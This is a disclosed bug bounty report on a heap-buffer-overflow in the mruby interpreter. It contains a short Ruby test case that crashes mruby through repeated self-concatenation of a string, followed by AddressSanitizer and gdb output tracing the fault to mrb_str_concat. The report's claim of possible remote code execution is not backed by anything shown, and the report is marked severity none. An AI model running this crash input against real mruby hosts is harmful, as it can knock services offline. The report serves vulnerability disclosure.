# heap-buffer-overflow on mruby

## Report Details
- **Report ID**: 192665
- **URL**: https://hackerone.com/reports/192665
- **State**: Closed
- **Severity**: none
- **Submitted**: 2016-12-20T08:41:12.747Z
- **Disclosed**: 2017-02-10T21:49:05.640Z

## Reporter
- **Username**: ahihi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Test case:
```
A = 'z'
C = ['a','a','a','a','a','a','a','a','a','a']
I = [*C,'a','a','a','a','a','a','a','a','a']
J = [*I,'a','a','a','a','a','a','a','a','a']
M = [A,A,A,*J]
for a in M do
	A<<A
end
```
IMPACT
ASAN report this as heap-buffer-overflow, and it crashed on
```
 #0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37
```
It can leach to remote code execution.
ASAN report
```
./mruby/bin/mruby ../ruby/f.rb
=================================================================
==7324== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f65ca1b4800 at pc 0x7f660aadf44d bp 0x7fffe216bae0 sp 0x7fffe216b2a0
WRITE of size 1073741824 at 0x7f65ca1b4800 thread T0
    #0 0x7f660aadf44c (/usr/lib/x86_64-linux-gnu/libasan.so.0.0.0+0xe44c)
    #1 0x45672c (/home/s/rubys/mruby/bin/mruby+0x45672c)
    #2 0x4e6659 (/home/s/rubys/mruby/bin/mruby+0x4e6659)
    #3 0x41ce4b (/home/s/rubys/mruby/bin/mruby+0x41ce4b)
    #4 0x417f53 (/home/s/rubys/mruby/bin/mruby+0x417f53)
    #5 0x42def2 (/home/s/rubys/mruby/bin/mruby+0x42def2)
    #6 0x498300 (/home/s/rubys/mruby/bin/mruby+0x498300)
    #7 0x4983d3 (/home/s/rubys/mruby/bin/mruby+0x4983d3)
    #8 0x4037fd (/home/s/rubys/mruby/bin/mruby+0x4037fd)
    #9 0x7f660a72df44 (/lib/x86_64-linux-gnu/libc-2.19.so+0x21f44)
    #10 0x4020b8 (/home/s/rubys/mruby/bin/mruby+0x4020b8)
0x7f65ca1b4801 is located 0 bytes to the right of 1073741825-byte region [0x7f658a1b4800,0x7f65ca1b4801)
allocated by thread T0 here:
    #0 0x7f660aae655f (/usr/lib/x86_64-linux-gnu/libasan.so.0.0.0+0x1555f)
    #1 0x410474 (/home/s/rubys/mruby/bin/mruby+0x410474)
    #2 0x409660 (/home/s/rubys/mruby/bin/mruby+0x409660)
    #3 0x409763 (/home/s/rubys/mruby/bin/mruby+0x409763)
    #4 0x451801 (/home/s/rubys/mruby/bin/mruby+0x451801)
    #5 0x4563cf (/home/s/rubys/mruby/bin/mruby+0x4563cf)
    #6 0x4e6659 (/home/s/rubys/mruby/bin/mruby+0x4e6659)
    #7 0x41ce4b (/home/s/rubys/mruby/bin/mruby+0x41ce4b)
    #8 0x417f53 (/home/s/rubys/mruby/bin/mruby+0x417f53)
    #9 0x42def2 (/home/s/rubys/mruby/bin/mruby+0x42def2)
    #10 0x498300 (/home/s/rubys/mruby/bin/mruby+0x498300)
    #11 0x4983d3 (/home/s/rubys/mruby/bin/mruby+0x4983d3)
    #12 0x4037fd (/home/s/rubys/mruby/bin/mruby+0x4037fd)
    #13 0x7f660a72df44 (/lib/x86_64-linux-gnu/libc-2.19.so+0x21f44)
Shadow bytes around the buggy address:
  0x0fed3942e8b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fed3942e8c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fed3942e8d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fed3942e8e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fed3942e8f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fed3942e900:[01]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fed3942e910: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fed3942e920: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fed3942e930: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fed3942e940: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fed3942e950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==7324== ABORTING
````
when compile with symbol
```
$ gdb ./mruby/bin/mruby
(gdb) r crashed.rb
Starting program: /home/s/ruby/mruby/bin/mruby crashed.rb

Program received signal SIGSEGV, Segmentation fault.
__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37
37      ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.
(gdb) backtrace
#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:37
#1  0x00000000004217fd in mrb_str_concat (mrb=0x6ac010, self=..., other=...) at /home/s/ruby/mruby/src/string.c:762
#2  0x000000000045f728 in mrb_str_concat2 (mrb=0x6ac010, self=...) at /home/s/ruby/mruby/mrbgems/mruby-string-ext/src/string.c:151
#3  0x000000000040b9cf in mrb_vm_exec (mrb=0x6ac010, proc=0x6ad3e0, pc=0x71a350) at /home/s/ruby/mruby/src/vm.c:1171
#4  0x0000000000409ef3 in mrb_vm_run (mrb=0x6ac010, proc=0x6ae460, self=..., stack_keep=0) at /home/s/ruby/mruby/src/vm.c:772
#5  0x0000000000411e99 in mrb_top_run (mrb=0x6ac010, proc=0x6ae460, self=..., stack_keep=0) at /home/s/ruby/mruby/src/vm.c:2487
#6  0x000000000043bb47 in mrb_load_exec (mrb=0x6ac010, p=0x7082c0, c=0x706f30) at /home/s/ruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#7  0x000000000043bbdd in mrb_load_file_cxt (mrb=0x6ac010, f=0x707f00, c=0x706f30) at /home/s/ruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764
#8  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe6a8) at /home/s/ruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
```

## Attachments
- gen.rb
